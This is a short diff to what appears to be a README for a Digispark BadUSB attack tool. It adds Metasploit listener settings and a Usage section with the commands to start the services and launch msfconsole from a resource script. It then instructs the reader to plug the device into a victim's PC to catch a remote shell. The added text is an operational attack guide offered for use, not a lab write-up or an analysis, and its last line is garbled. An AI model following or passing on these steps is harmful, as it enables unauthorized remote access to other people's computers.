@@ -27,4 +27,14 @@ The attacker uses Kali Linux in the current version, the Metasploit framework an
   + set lhost 0.0.0.0
   + set lport XXX
 	
+### Usage
+- Prepare Kali Linux
+- Open terminal:
 
+  ```
+  service postgresql start
+  service apache2 start
+  msfconsole -r shell.rc
+  ```
+
+- Plug Digispark into victim's PC and listener the their system 
